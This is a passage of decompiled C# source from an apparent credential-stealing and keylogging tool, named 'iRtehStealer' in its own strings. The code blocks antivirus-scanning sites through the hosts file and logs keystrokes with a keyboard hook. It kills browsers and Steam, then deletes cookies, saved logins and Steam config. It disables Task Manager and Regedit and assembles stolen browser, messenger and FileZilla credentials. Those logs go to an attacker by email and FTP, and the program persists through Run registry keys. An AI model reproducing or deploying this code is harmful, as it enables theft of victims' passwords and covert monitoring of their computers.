		return Encoding.ASCII.GetString(bytes);
	}

	public void Hosts()
	{
		try
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
			string text = folderPath + "\\drivers\\etc\\\\hosts";
			if ((File.GetAttributes(text) & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(text, FileAttributes.Normal);
			}
			string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.System);
			string text2 = folderPath2 + "\\drivers\\etc\\\\hosts";
			StreamWriter streamWriter = new StreamWriter(text2);
			streamWriter.Write("##Do not touch this file, changing it will cause SERIOUS damage to your computer");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 www.rsbot.org/vb/");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 rsbot.org/vb/");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 85.25.184.47");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 www.rsbot.com");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 www.rsbot.com");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 www.rsbot.org");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 www.rsbot.org");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 virustotal.com");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 www.virustotal.com");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 www.virusscan.jotti.org/");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 www.virusscan.jotti.org/en");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 www.virusscan.jotti.org/en");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 www.rsbots.net");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 rsbots.net");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 www.RSbots.net");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 www.AutoFighter.org");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 www.RSBotting.com");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 www.RSTrainers.com");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 www.CodeSpace.net");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 www.RsAutoCheats.com");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 www.XxBots.net");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 www.AutoFarmer.org");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 www.kMiner.org");
			streamWriter.Dispose();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SetForegroundWindow(IntPtr hwnd);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr handle, [MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

	public T CreateAPI<T>(string name, string method)
	{
		return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref name), ref method), typeof(T));
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SetWindowsHookExA(int idHook, KeyboardHookDelegate lpfn, int hmod, int dwThreadId);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetAsyncKeyState(int vKey);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	public void HookKeyboard()
	{
		callback = _kBoardCallBaq;
		KeyboardHandle = (IntPtr)SetWindowsHookExA(13, callback, (int)Process.GetCurrentProcess().MainModule!.BaseAddress, 0);
	}

	public int _kBoardCallBaq(int Code, int wParam, ref KBDLLHOOKSTRUCT lParam)
	{
		string text = _getActiveWinTit();
		if (Operators.CompareString(text, LastCheckedForegroundTitle, false) != 0)
		{
			LastCheckedForegroundTitle = text;
			_kLoq = _kLoq + "\r\n\r\n-[ " + text + " (" + DateAndTime.get_Now().ToString() + ") ]-\r\n\r\n";
		}
		string text2 = "";
		if (wParam == 256 || wParam == 260)
		{
			checked
			{
				switch (lParam.vkCode)
				{
				case 8:
					text2 = "[BS]";
					break;
				case 9:
					text2 = "\r\n[Tab] ";
					break;
				case 13:
					text2 = "\r\n";
					break;
				case 20:
					text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_CapsLock()) ? "[CL]" : "[/CL]");
					break;
				case 27:
					text2 = "[Esc]";
					break;
				case 32:
					text2 = " ";
					break;
				case 33:
					text2 = "[PU]";
					break;
				case 34:
					text2 = "[PD]";
					break;
				case 35:
					text2 = "[End]";
					break;
				case 36:
					text2 = "[Home]";
					break;
				case 37:
					text2 = "[L]";
					break;
				case 38:
					text2 = "[U]";
					break;
				case 39:
					text2 = "[R]";
					break;
				case 40:
					text2 = "[D]";
					break;
				case 44:
					text2 = "[PrS]";
					break;
				case 45:
					text2 = "[Ins]";
					break;
				case 46:
					text2 = "[Del]";
					break;
				case 48:
				case 49:
				case 50:
				case 51:
				case 52:
				case 53:
				case 54:
				case 55:
				case 56:
				case 57:
					text2 = Conversions.ToString(Strings.ChrW(lParam.vkCode));
					break;
				case 65:
				case 66:
				case 67:
				case 68:
				case 69:
				case 70:
				case 71:
				case 72:
				case 73:
				case 74:
				case 75:
				case 76:
				case 77:
				case 78:
				case 79:
				case 80:
				case 81:
				case 82:
				case 83:
				case 84:
				case 85:
				case 86:
				case 87:
				case 88:
				case 89:
				case 90:
					text2 = Conversions.ToString(Strings.ChrW(lParam.vkCode + 32));
					break;
				case 91:
					text2 = "[WinKeyL]";
					break;
				case 92:
					text2 = "[WinKeyR]";
					break;
				case 96:
					text2 = "0";
					break;
				case 97:
					text2 = "1";
					break;
				case 98:
					text2 = "2";
					break;
				case 99:
					text2 = "3";
					break;
				case 100:
					text2 = "4";
					break;
				case 101:
					text2 = "5";
					break;
				case 102:
					text2 = "6";
					break;
				case 103:
					text2 = "7";
					break;
				case 104:
					text2 = "8";
					break;
				case 105:
					text2 = "9";
					break;
				case 112:
				case 113:
				case 114:
				case 115:
				case 116:
				case 117:
				case 118:
				case 119:
				case 120:
				case 121:
				case 122:
				case 123:
				case 124:
				case 125:
				case 126:
				case 127:
				case 128:
				case 129:
				case 130:
				case 131:
				case 132:
				case 133:
				case 134:
				case 135:
					text2 = "[F" + Conversions.ToString(lParam.vkCode - 111) + "]";
					break;
				case 144:
					text2 = "[NL]";
					break;
				case 145:
					text2 = "[PA]";
					break;
				case 160:
				case 161:
					text2 = "[S] ";
					break;
				case 162:
				case 163:
					text2 = "[C] ";
					break;
				case 164:
					text2 = "[A] ";
					break;
				case 165:
					text2 = "[Ar] ";
					break;
				case 186:
					text2 = ":";
					break;
				case 187:
					text2 = "=";
					break;
				case 188:
					text2 = ",";
					break;
				case 109:
				case 189:
					text2 = "-";
					break;
				case 110:
				case 190:
					text2 = ".";
					break;
				case 191:
					text2 = "/";
					break;
				case 192:
					text2 = "~";
					break;
				default:
					text2 = Conversions.ToString(lParam.vkCode);
					break;
				case 219:
					text2 = "[";
					break;
				case 220:
					text2 = "\\";
					break;
				case 221:
					text2 = "]";
					break;
				case 222:
					text2 = "'";
					break;
				}
			}
		}
		else if (wParam == 257 || wParam == 261)
		{
			switch (lParam.vkCode)
			{
			case 160:
			case 161:
				text2 = " [/S]";
				break;
			case 162:
			case 163:
				text2 = " [/C]";
				break;
			case 164:
				text2 = " [/A]";
				break;
			case 165:
				text2 = " [/Ar]";
				break;
			}
		}
		_kLoq += text2;
		RTKLog.set_Text(_kLoq);
		CallNextHookEx callNextHookEx = CreateAPI<CallNextHookEx>("user32", "CallNextHookEx");
		return callNextHookEx((int)KeyboardHandle, Code, wParam, lParam);
	}

	private string _getActiveWinTit()
	{
		string lpString = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}

	[DllImport("shell32.dll")]
	private static extern bool SHGetSpecialFolderPath(IntPtr hwndOwner, [Out] StringBuilder lpszPath, int nFolder, bool fCreate);

	public void KillProcesses(bool InternetExplorer, bool Firefox)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (Firefox)
			{
				if (process.MainWindowTitle.Contains("Mozilla Firefox"))
				{
					process.Kill();
				}
				else if (Operators.CompareString(process.ProcessName, "firefox.exe", false) == 0)
				{
					process.Kill();
				}
			}
			if (InternetExplorer)
			{
				if (process.MainWindowTitle.Contains("Internet Explorer"))
				{
					process.Kill();
				}
				else if (Operators.CompareString(process.ProcessName, "iexplore.exe", false) == 0)
				{
					process.Kill();
				}
			}
		}
	}

	public void DeleteIEHistory(bool Enable)
	{
		if (!Enable)
		{
			return;
		}
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.History);
		if (!Directory.Exists(folderPath))
		{
			return;
		}
		foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(folderPath))
		{
			try
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(file);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void DeleteIECookies(bool Enable)
	{
		if (!Enable)
		{
			return;
		}
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Cookies);
		if (!Directory.Exists(folderPath))
		{
			return;
		}
		foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(folderPath))
		{
			try
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(file);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void DeleteIECache(bool Enable)
	{
		if (!Enable)
		{
			return;
		}
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.InternetCache);
		if (Directory.Exists(folderPath + "\\Content.IE5"))
		{
			foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(folderPath + "\\Content.IE5"))
			{
				try
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(file);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(folderPath))
		{
			try
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteDirectory(directory, (DeleteDirectoryOption)5);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void DeleteWinRecent(bool Enable)
	{
		if (!Enable)
		{
			return;
		}
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Recent);
		foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(folderPath))
		{
			try
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(file);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void DeleteWinTemp(bool Enable)
	{
		if (!Enable)
		{
			return;
		}
		string text = Environment.GetFolderPath(Environment.SpecialFolder.InternetCache).Remove(Environment.GetFolderPath(Environment.SpecialFolder.InternetCache).LastIndexOf("\\"));
		if (!Directory.Exists(text))
		{
			return;
		}
		foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(text))
		{
			if (directory.Substring(checked(directory.LastIndexOf("\\") + 1)).StartsWith("App"))
			{
				continue;
			}
			foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory))
			{
				try
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(file);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			foreach (string directory2 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(directory))
			{
				try
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteDirectory(directory2, (DeleteDirectoryOption)5);
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
			try
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteDirectory(directory, (DeleteDirectoryOption)5);
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}

	[DllImport("shell32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SHEmptyRecycleBinA(int hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string pszRootPath, int dwFlags);

	[DllImport("shell32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SHUpdateRecycleBinIcon();

	private void DeleteWinRecycleBin(bool Enable)
	{
		if (Enable)
		{
			int hWnd = ((Control)this).get_Handle().ToInt32();
			string pszRootPath = null;
			SHEmptyRecycleBinA(hWnd, ref pszRootPath, 7);
			SHUpdateRecycleBinIcon();
		}
	}

	public void DeleteMozillaCookies(bool Enable)
	{
		if (!Enable)
		{
			return;
		}
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles";
		if (!Directory.Exists(text))
		{
			return;
		}
		foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(text))
		{
			foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory))
			{
				if (file.Contains("cookie"))
				{
					try
					{
						((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(file);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
	}

	public void DeleteMozillaCache(bool Enable)
	{
		if (!Enable)
		{
			return;
		}
		string text = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp()
			.Remove(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp()
				.LastIndexOf("\\"));
		if (!Directory.Exists(text))
		{
			return;
		}
		foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(text))
		{
			foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory))
			{
				try
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(file);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	public void DeleteMozillaSignons(bool Enable)
	{
		if (!Enable)
		{
			return;
		}
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles";
		if (!Directory.Exists(text))
		{
			return;
		}
		foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(text))
		{
			foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory))
			{
				if (file.Contains("signon"))
				{
					try
					{
						((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(file);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
	}

	public void DeleteWoWCache(bool Enable)
	{
		if (!Enable)
		{
			return;
		}
		string text = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop()
			.Remove(3) + "Program Files\\World of Warcraft\\Cache\\WDB";
		string text2 = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop()
			.Remove(3) + "Program Files\\World of Warcraft\\WTF";
		if (Directory.Exists(text))
		{
			foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(text))
			{
				try
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(file);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		if (!Directory.Exists(text2))
		{
			return;
		}
		foreach (string file2 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(text2))
		{
			try
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(file2);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void KillSteamProcess()
	{
		Process[] processesByName = Process.GetProcessesByName("steam");
		try
		{
			Process[] array = processesByName;
			foreach (Process process in array)
			{
				process.Kill();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void DeleteSteamCache()
	{
		try
		{
			string text = ((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Valve\\Steam", "SteamPath", (object)"").ToString();
			text += "/config/SteamAppData.vdf";
			SteamCachePath.set_Text(text);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (File.Exists(SteamCachePath.get_Text()))
		{
			try
			{
				File.Delete(SteamCachePath.get_Text());
				return;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		if (File.Exists("D:\\Program Files (x86)\\steam\\config\\SteamAppData.vdf"))
		{
			try
			{
				File.Delete("D:\\Program Files (x86)\\steam\\config\\SteamAppData.vdf");
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
		if (File.Exists("D:\\Program Files (x86)\\steam\\config\\SteamAppData.vdf"))
		{
			try
			{
				File.Delete("D:\\Program Files (x86)\\steam\\config\\SteamAppData.vdf");
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
		}
		if (File.Exists("C:\\Program Files (x86)\\steam\\config\\SteamAppData.vdf"))
		{
			try
			{
				File.Delete("C:\\Program Files (x86)\\steam\\config\\SteamAppData.vdf");
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
			}
		}
		if (File.Exists("C:\\Program Files\\steam\\config\\SteamAppData.vdf"))
		{
			try
			{
				File.Delete("C:\\Program Files\\steam\\config\\SteamAppData.vdf");
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
			}
		}
		if (File.Exists("D:\\Program Files\\steam\\config\\SteamAppData.vdf"))
		{
			try
			{
				File.Delete("D:\\Program Files\\steam\\config\\SteamAppData.vdf");
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void DeleteCookies()
	{
		try
		{
			FileSystem.Kill(Environment.GetFolderPath(Environment.SpecialFolder.Cookies) + "\\*.*");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void DisableTaskMan()
	{
		try
		{
			((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", (object)"1", RegistryValueKind.DWord);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void DisableRegedit()
	{
		try
		{
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("DisableRegistryTools", "1", RegistryValueKind.DWord);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_0()
	{
		RTStealLog.set_Text("=========PC Information=========\r\n" + RTPCInfo.get_Text() + "\r\n\r\n=========MSN Steal=========\r\n" + RTMsn.get_Text() + "\r\n=========Chrome Steal=========\r\n" + RTChrome.get_Text() + "\r\n=========Firefox Steal=========\r\n" + RTFirefox.get_Text() + "\r\n=========Internet Explorer Steal=========\r\n" + RTInternetExplorer.get_Text() + "\r\n=========FileZilla Steal=========\r\n" + RTFileZilla.get_Text() + "\r\n\r\n=========IMVU Steal=========\r\n" + RTIMVU.get_Text() + "\r\n\r\n=========No-IP Steal=========\r\n" + RTNoIP.get_Text() + "\r\n\r\n=========Pidgin Steal=========\r\n" + RTPidgin.get_Text() + "\r\n\r\n=========Windows pYrTgbzWFEpYpYrT=========\r\n" + RTWindowsKey.get_Text() + "\r\n\r\n");
		string text = Interaction.Environ("tmp") + "\\TMP.dat";
		if (File.Exists(text))
		{
			try
			{
				StreamReader streamReader = new StreamReader(text);
				string text2 = streamReader.ReadToEnd();
				RTKeys.set_Text(text2);
				RTStealLog.set_Text(RTStealLog.get_Text() + "=========CD-Key Steal=========\r\n" + RTKeys.get_Text());
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public object _sendsteelLogsEmail(string _eemail, string _pasasword, string _smXtp, string _pOrort)
	{
		object result = default(object);
		try
		{
			MailMessage mailMessage = new MailMessage();
			mailMessage.From = new MailAddress(_eemail);
			mailMessage.To.Add(_eemail);
			mailMessage.Subject = "iRtehStealer:STEAL:" + ((ServerComputer)MyProject.Computer).get_Name();
			mailMessage.Body = RTStealLog.get_Text();
			SmtpClient smtpClient = new SmtpClient(_smXtp);
			smtpClient.Port = Conversions.ToInteger(_pOrort);
			smtpClient.Credentials = new NetworkCredential(_eemail, _pasasword);
			smtpClient.EnableSsl = true;
			smtpClient.Send(mailMessage);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public object _zendLoqs(string _effTeePeehost, string _effTeePeeUseAre, string _effTeePeeAssP)
	{
		string host = "ftp://" + _effTeePeehost;
		UploadFTP_Text(host, _effTeePeeUseAre, _effTeePeeAssP);
		object result = default(object);
		return result;
	}

	private bool _cre8effTEEpeeDir(string Host_and_Path, string Username, string Password)
	{
		try
		{
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(Host_and_Path);
			ftpWebRequest.Credentials = new NetworkCredential(Username, Password);
			ftpWebRequest.Method = "MKD";
			WebResponse response = ftpWebRequest.GetResponse();
			response.Close();
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private string GetExternalIP()
	{
		try
		{
			WebClient webClient = new WebClient();
			string @string = Encoding.ASCII.GetString(webClient.DownloadData("http://whatismyip.com/automation/n09230945.asp"));
			webClient.Dispose();
			return @string;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private string Get_kLoqgerTimeFormat()
	{
		try
		{
			string text = Conversions.ToString(DateTime.Today);
			text = text.Replace("/", ".");
			string text2 = DateTime.Now.TimeOfDay.ToString();
			int startIndex = text2.IndexOf(".");
			string text3 = text2.Remove(startIndex);
			text3 = text3.Replace(":", ".");
			return text + "--" + text3;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public bool UploadFTP_Text(string Host, string _uzername, string _pazzword)
	{
		Uri uri = new Uri(Host);
		if (uri.HostNameType == UriHostNameType.Dns)
		{
			if (!Host.EndsWith("/"))
			{
				Host += "/";
			}
			string text = "STEAL..:.." + ((ServerComputer)MyProject.Computer).get_Name() + GetExternalIP() + "@" + Get_kLoqgerTimeFormat() + ".txt";
			_cre8effTEEpeeDir(Host + GetExternalIP(), _uzername, _pazzword);
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(Host + GetExternalIP() + "/" + text);
			ftpWebRequest.Credentials = new NetworkCredential(_uzername, _pazzword);
			ftpWebRequest.Method = "STOR";
			byte[] bytes = Encoding.ASCII.GetBytes(RTStealLog.get_Text());
			Stream requestStream = ftpWebRequest.GetRequestStream();
			requestStream.Write(bytes, 0, bytes.Length);
			requestStream.Close();
			requestStream.Dispose();
			return true;
		}
		bool result = default(bool);
		return result;
	}

	public object SendKeyLogsEmail(string address, string pass, string smtp, string port)
	{
		object result = default(object);
		try
		{
			MailMessage mailMessage = new MailMessage();
			mailMessage.From = new MailAddress(address);
			mailMessage.To.Add(address);
			mailMessage.Subject = "iRtehStealer:KEYLOGS:" + ((ServerComputer)MyProject.Computer).get_Name();
			mailMessage.Body = "The victim has used the clipboard " + lblNumb.get_Text() + " times:\r\n\r\nClipboard Logger:\r\n----------------\r\n" + RTBClipboard.get_Text() + "\r\n----------------\r\nLogs:\r\n----------------\r\n" + RTKLog.get_Text();
			SmtpClient smtpClient = new SmtpClient(smtp);
			smtpClient.Port = Conversions.ToInteger(port);
			smtpClient.Credentials = new NetworkCredential(address, pass);
			smtpClient.EnableSsl = true;
			smtpClient.Send(mailMessage);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public object SendKeyLogsFTP(string FTPhost, string FTPuser, string FTPpass)
	{
		string host = "ftp://" + FTPhost;
		UploadFTPKLog_Text(host, FTPuser, FTPpass);
		object result = default(object);
		return result;
	}

	private bool CreateFTPDirectory(string Host_and_Path, string Username, string Password)
	{
		try
		{
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(Host_and_Path);
			ftpWebRequest.Credentials = new NetworkCredential(Username, Password);
			ftpWebRequest.Method = "MKD";
			WebResponse response = ftpWebRequest.GetResponse();
			response.Close();
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private string GetKeyloggerTimeFormat()
	{
		try
		{
			string text = Conversions.ToString(DateTime.Today);
			text = text.Replace("/", ".");
			string text2 = DateTime.Now.TimeOfDay.ToString();
			int startIndex = text2.IndexOf(".");
			string text3 = text2.Remove(startIndex);
			text3 = text3.Replace(":", ".");
			return text + "--" + text3;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public bool UploadFTPKLog_Text(string Host, string Username, string Password)
	{
		Uri uri = new Uri(Host);
		if (uri.HostNameType == UriHostNameType.Dns)
		{
			if (!Host.EndsWith("/"))
			{
				Host += "/";
			}
			string text = "KEYLOG..:.." + ((ServerComputer)MyProject.Computer).get_Name() + GetExternalIP() + "@" + GetKeyloggerTimeFormat() + ".txt";
			CreateFTPDirectory(Host + GetExternalIP(), Username, Password);
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(Host + GetExternalIP() + "/" + text);
			ftpWebRequest.Credentials = new NetworkCredential(Username, Password);
			ftpWebRequest.Method = "STOR";
			byte[] bytes = Encoding.ASCII.GetBytes("The victim has used the clipboard " + lblNumb.get_Text() + " times:\r\n\r\nClipboard Logger:\r\n----------------\r\n" + RTBClipboard.get_Text() + "\r\n----------------\r\nLogs:\r\n----------------\r\n" + RTKLog.get_Text());
			Stream requestStream = ftpWebRequest.GetRequestStream();
			requestStream.Write(bytes, 0, bytes.Length);
			requestStream.Close();
			requestStream.Dispose();
			return true;
		}
		bool result = default(bool);
		return result;
	}

	public object _ins(string _exeName, string _foldName)
	{
		string executablePath = Application.get_ExecutablePath();
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + _exeName;
		try
		{
			if (Operators.CompareString(executablePath, text, false) != 0)
			{
				File.Copy(executablePath, text);
				Process.Start(text);
				ProjectData.EndApp();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if (registryKey.GetValue(_foldName) == null)
			{
				registryKey.SetValue(_foldName, text);
			}
			registryKey.Close();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		object result = default(object);
		try
		{
			RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if (registryKey2.GetValue(_foldName) == null)
			{
				registryKey2.SetValue(_foldName, text);
			}
			registryKey2.Close();
			return result;
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public void _dLoad(string _urL)
	{
		try
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\";
			Random random = new Random();
